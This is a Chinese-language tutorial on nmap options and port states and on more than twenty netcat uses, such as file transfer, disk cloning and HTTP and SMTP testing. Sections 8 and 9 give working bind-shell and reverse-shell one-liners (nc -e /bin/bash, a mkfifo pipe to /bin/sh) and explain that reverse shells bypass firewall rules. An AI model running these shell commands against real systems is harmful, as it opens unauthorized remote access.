# nmap与nc

## nmap

nmap - 网络探索工具和安全/端口扫描

### 语法

```shell
nmap [Scan Type...] [Options] {target specification}
```

### 主要参数

```
-sP：Ping Scan 只利用ping扫描进行主机发现，不进行端口扫描

–sS：TCP SYN扫描，半开放扫描，扫描速度快，不易被注意到（不完成TCP连接）；且能明确区分open|closed|filtered

                        i.             Open         SYN/ACK

                      ii.             Closed       RST复位

                     iii.             Filtered    数次重发没响应，或者收到ICMP不可达

–sT：TCPConnect()，建立连接，容易被记录；对原始报文控制少，效率低

–sU：激活UDP扫描，对UDP服务进行扫描，如DNS/SNMP/DHCP等，可以和TCP扫描结合使用；但是效率低下，开放的和被过滤的端口很少响应，加速UDP扫描的方法包括并发扫描更多的主机，先只对主要端口进行快速扫描，从防火墙后面扫描，使用--host-timeout跳过慢速的主机


–p <port ranges>：只扫描指定的端口，单个端口和用连字符表示的端口范围都可以；当既扫描TCP端口又扫描UDP端口时，您可以通过在端口号前加上T: 或者U:指定协议。协议限定符一直有效您直到指定另一个。例如，参数 -p U:53，111，137，T:21-25，80，139，8080 将扫描UDP 端口53，111，和137，同时扫描列出的TCP端口。注意，要既扫描 UDP又扫描TCP，您必须指定 -sU ，以及至少一个TCP扫描类型(如 -sS，-sF，或者 -sT)

–p <name>：扫描指定的端口名称，如nmap–p smtp,http 10.10.1.44

–p U:[UDP ports],T:[TCP ports]：对指定的端口进行指定协议的扫描

–F：快速扫描（仅扫描100个最常用的端口），nmap-services文件指定想要扫描的端口；可以用—datadir选项指定自己的小小nmap-services文件

 –O：启用操作系统检测；-A可以同时启用操作系统检测和版本检测
 -n：不进行反向解析
 
```



### 端口状态

1）  Nmap将端口分成六个状态

a)        open（开放的）：            该端口正在接收TCP连接或者UDP报文

b)        closed（关闭的）：         关闭的端口接收nmap的探测报文并做出响应

c)        filtered（被过滤的）：   探测报文被包过滤阻止无法到达端口，nmap无法确定端口的开放情况

d)        unfiltered（未被过滤的）：端口可访问，但nmap仍无法确定端口的开放情况

e)        open|filtered（开放或者被过滤的）：无法确定端口是开放的还是被过滤的

f)         closed|filtered（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的

### 案例

- **扫描多个IP用法**

```
# nmap 10.0.1.161  10.0.1.162
# nmap 10.0.1.161,162
# nmap 10.0.1.161-180
# nmap  10.0.3.0/24
```

- **扫描地址段是排除某个IP地址**
```
nmap 10.0.1.0/24 --exclude 10.0.1.162
```
- **扫描192.168.0.0网段主机**
```
nmap -n -sP 192.168.0.0/24|grep -Eo "([0-9]+\.){3}[0-9]+"
```

## nc

## 参数

想要连接到某处: `nc [-options] hostname port[s] [ports] …`
绑定端口等待连接: `nc -l port [-options] [hostname] [port]`

- -g<网关>：设置路由器跃程通信网关，最多设置8个;
- -G<指向器数目>：设置来源路由指向器，其数值为4的倍数;
- -h：在线帮助;
- -i<延迟秒数>：设置时间间隔，以便传送信息及扫描通信端口;
- -l：使用监听模式，监控传入的资料;
- -n：直接使用ip地址，而不通过域名服务器;
- -o<输出文件>：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存;
- -p<通信端口>：设置本地主机使用的通信端口;
- -r：指定源端口和目的端口都进行随机的选择;
- -s<来源位址>：设置本地主机送出数据包的IP地址;
- -u：使用UDP传输协议;
- -v：显示指令执行过程;
- -w<超时秒数>：设置等待连线的时间;
- -z：使用0输入/输出模式，只在扫描通信端口时使用。

 

## 用法

[A Server(192.168.1.1) B Client(192.168.1.2)]

#### 0.连接到远程主机:

```
$nc -nvv 192.168.x.x 80
```

连到192.168.x.x的TCP80端口.

##### 监听本地主机:

```
$nc -l 80
```

监听本机的TCP80端口.

##### 超时控制:

多数情况我们不希望连接一直保持，那么我们可以使用 -w 参数来指定连接的空闲超时时间，该参数紧接一个数值，代表秒数，如果连接超过指定时间则连接会被终止。

##### Server

```
$ nc -l 2389
```

##### Client

```
$ nc -w 10 localhost 2389
```

该连接将在 10 秒后中断。
注意: 不要在服务器端同时使用 -w 和 -l 参数，因为 -w 参数将在服务器端无效果。

#### 1.端口扫描

端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。

```
$ nc -z -n 192.168.1.1 21-25
```

可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.
z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换.
v 参数指详细输出.
n 参数告诉netcat 不要使用DNS反向查询IP地址的域名.
以上命令会打印21到25 所有开放的端口。

```
$ nc -v 127.0.0.1 22
localhost [127.0.0.1] 22 (ssh) open
SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
```

"SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4"为Banner信息。Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner.一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。

#### 2.Chat Server

假如你想和你的朋友聊聊，有很多的软件和信息服务可以供你使用。但是，如果你没有这么奢侈的配置，比如你在计算机实验室，所有的对外的连接都是被限制的，你怎样和整天坐在隔壁房间的朋友沟通那？不要郁闷了，netcat提供了这样一种方法，你只需要创建一个Chat服务器，一个预先确定好的端口，这样子他就可以联系到你了。

##### Server

```
$nc -l 20000
```

netcat 命令在20000端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。

##### Client

```
$nc 192.168.1.1 20000
```

不管你在机器B上键入什么都会出现在机器A上。

#### 3.文件传输

大部分时间中，我们都在试图通过网络或者其他工具传输文件。有很多种方法，比如FTP,SCP,SMB等等，但是当你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。假设，你想要传一个文件file.txt 从A 到B。A或者B都可以作为服务器或者客户端.

##### Server

```
$nc -l 20000 < file.txt
```

##### Client

```
$nc -n 192.168.1.1 20000 > file.txt
```

这里我们创建了一个服务器在A上并且重定向netcat的输入为文件file.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。
在客户端我们重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt.
没有必要创建文件源作为Server，我们也可以相反的方法使用。像下面的我们发送文件从B到A，但是服务器创建在A上，这次我们仅需要重定向netcat的输出并且重定向B的输入文件。
B作为Server

##### Server

```
$nc -l 20000 > file.txt
```

##### Client

```
$nc 192.168.1.2 20000 < file.txt
```

 

#### 4.目录传输

发送一个文件很简单，但是如果我们想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。
如果你想要通过网络传输一个目录从A到B。

##### Server

```
$tar -cvf – dir_name | nc -l 20000
```

##### Client

```
$nc -n 192.168.1.1 20000 | tar -xvf -
```

这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。
在客户端我们下载该压缩包通过netcat 管道然后打开文件。
如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。

##### Server

```
$tar -cvf – dir_name| bzip2 -z | nc -l 20000
```

通过bzip2压缩

##### Client

```
$nc -n 192.168.1.1 20000 | bzip2 -d |tar -xvf -
```

 

#### 5. 加密你通过网络发送的数据

如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如mcrypt的工具加密。

##### Server

```
$nc localhost 20000 | mcrypt –flush –bare -F -q -d -m ecb > file.txt
```

使用mcrypt工具加密数据。

##### Client

```
$mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 20000
```

使用mcrypt工具解密数据。
以上两个命令会提示需要密码，确保两端使用相同的密码。
这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。

#### 6.流视频

虽然不是生成流视频的最好方法，但如果服务器上没有特定的工具，使用netcat，我们仍然有希望做成这件事。

##### Server

```
$cat video.avi | nc -l 20000
```

这里我们只是从一个视频文件中读入并重定向输出到netcat客户端

##### Client

```
$nc 192.168.1.1 20000 | mplayer -vo x11 -cache 3000 -
```

这里我们从socket中读入数据并重定向到mplayer。

#### 7. 克隆一个设备

如果你已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。不在需要重复配置安装的过程，只启动另一台机器的一些引导可以随身碟和克隆你的机器。
克隆Linux PC很简单，假如你的系统在磁盘/dev/sda上

##### Server

```
$dd if=/dev/sda | nc -l 20000
```

##### Client

```
$nc -n 192.168.1.1 20000 | dd of=/dev/sda
```

dd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。

#### 8.打开一个shell

我们已经用过远程shell-使用telnet和ssh，但是如果这两个命令没有安装并且我们没有权限安装他们，我们也可以使用netcat创建远程shell。
假设你的netcat支持 -c -e 参数(原生 netcat)

##### Server

```
$nc -l 20000 -e /bin/bash -i
```

##### Client

```
$nc 192.168.1.1 20000
```

这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash
假如netcat 不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell

##### Server

```
$mkfifo /tmp/tmp_fifo
$cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 20000 > /tmp/tmp_fifo
```

这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2>&1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口20000上。至此，我们已经把netcat的输出重定向到fifo文件中。
说明：
从网络收到的输入写到fifo文件中
cat 命令读取fifo文件并且其内容发送给sh命令
sh命令进程受到输入并把它写回到netcat。
netcat 通过网络发送输出到client
至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。
在客户端仅仅简单连接到服务器

##### Client

```
$nc -n 192.168.1.1 20000
```

你会得到一个shell提示符在客户端

#### 9.反向shell

反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。

##### Server

```
$nc -l 20000
```

在客户端，简单地告诉netcat在连接完成后，执行shell。

##### Client

```
$nc 192.168.1.1 20000 -e /bin/bash
```

现在，什么是反向shell的特别之处呢
反向shell经常被用来绕过防火墙的限制，如阻止入站连接。例如，我有一个专用IP地址为192.168.1.1，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如1.2.3.4的shell，那么我会用反向外壳用于这一目的。

#### 10.指定源端口

假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。

##### Server

```
$nc -l 20000
```

##### Client

```
$nc 192.168.1.1 20000 25
```

使用1024以内的端口需要root权限。
该命令将在客户端开启25端口用于通讯，否则将使用随机端口。

#### 11.指定源地址

假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。我们可以在netcat中使用-s选项指定ip地址。

##### Server

```
$nc -u -l 20000 < file.txt
```

##### Client

```
$nc -u 192.168.1.1 20000 -s 172.31.100.5 > file.txt
```

该命令将绑定地址172.31.100.5。

#### 12.静态web页面服务器

新建一个网页,命名为somepage.html;
新建一个shell script:

```
while true; do
    nc -l 80 -q 1 < somepage.html;
done
```

用root权限执行，然后在浏览器中输入127.0.0.1打开看看是否正确运行。
nc 指令通常都是給管理者進行除錯或測試等動作用的，所以如果只是單純需要臨時的網頁伺服器，使用 Python 的 SimpleHTTPServer 模組會比較方便。

#### 13.模拟HTTP Headers

```
$nc www.huanxiangwu.com 80
GET / HTTP/1.1
Host: ispconfig.org
Referrer: mypage.com
User-Agent: my-browser

HTTP/1.1 200 OK
Date: Tue, 16 Dec 2008 07:23:24 GMT
Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8
Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/
Expires: 0
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Cache-Control: private, post-check=0, pre-check=0, max-age=0
Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html
[......]
```

在nc命令后，输入红色部分的内容，然后按两次回车，即可从对方获得HTTP Headers内容。

#### 14.Netcat支持IPv6

netcat 的 -4 和 -6 参数用来指定 IP 地址类型，分别是 IPv4 和 IPv6：

##### Server

```
$ nc -4 -l 2389
```

##### Client

```
$ nc -4 localhost 2389
```

然后我们可以使用 netstat 命令来查看网络的情况：

```
$ netstat | grep 2389
tcp        0      0 localhost:2389          localhost:50851         ESTABLISHED
tcp        0      0 localhost:50851         localhost:2389          ESTABLISHED
```

接下来我们看看IPv6 的情况：

##### Server

```
$ nc -6 -l 2389
```

##### Client

```
$ nc -6 localhost 2389
```

再次运行 netstat 命令：

```
$ netstat | grep 2389
tcp6       0      0 localhost:2389          localhost:33234         ESTABLISHED
tcp6       0      0 localhost:33234         localhost:2389          ESTABLISHED
```

前缀是 tcp6 表示使用的是 IPv6 的地址。

#### 15.在 Netcat 中禁止从标准输入中读取数据

该功能使用 -d 参数，请看下面例子：

##### Server

```
$ nc -l 2389
```

##### Client

```
$ nc -d localhost 2389
Hi
```

你输入的 Hi 文本并不会送到服务器端。

#### 16.强制 Netcat 服务器端保持启动状态

如果连接到服务器的客户端断开连接，那么服务器端也会跟着退出。

##### Server

```
$ nc -l 2389
```

##### Client

```
$ nc localhost 2389
^C
```

##### Server

```
$ nc -l 2389
$
```

上述例子中，但客户端断开时服务器端也立即退出。
我们可以通过 -k 参数来控制让服务器不会因为客户端的断开连接而退出。

##### Server

```
$ nc -k -l 2389
```

##### Client

```
$ nc localhost 2389
^C
```

##### Server

```
$ nc -k -l 2389
```

 

#### 17.配置 Netcat 客户端不会因为 EOF 而退出

Netcat 客户端可以通过 -q 参数来控制接收到 EOF 后隔多长时间才退出，该参数的单位是秒：

##### Client

```
$nc  -q 5  localhost 2389
```

现在如果客户端接收到 EOF ，它将等待 5 秒后退出。

#### 18.手動使用 SMTP 協定寄信

在測試郵件伺服器是否正常時，可以使用這樣的方式手動寄送 Email：

```
$nc localhost 25 << EOF
HELO host.example.com
MAIL FROM: <user@host.example.com>
RCPT TO: <user2@host.example.com>
DATA
Body of email.
.
QUIT
EOF
```

 

#### 19.透過代理伺服器（Proxy）連線

這指令會使用 10.2.3.4:8080 這個代理伺服器，連線至 host.example.com 的42端口。

```
$nc -x10.2.3.4:8080 -Xconnect host.example.com 42
```

 

#### 20.使用 Unix Domain Socket

這行指令會建立一個 Unix Domain Socket，並接收資料：

```
$nc -lU /var/tmp/dsocket
```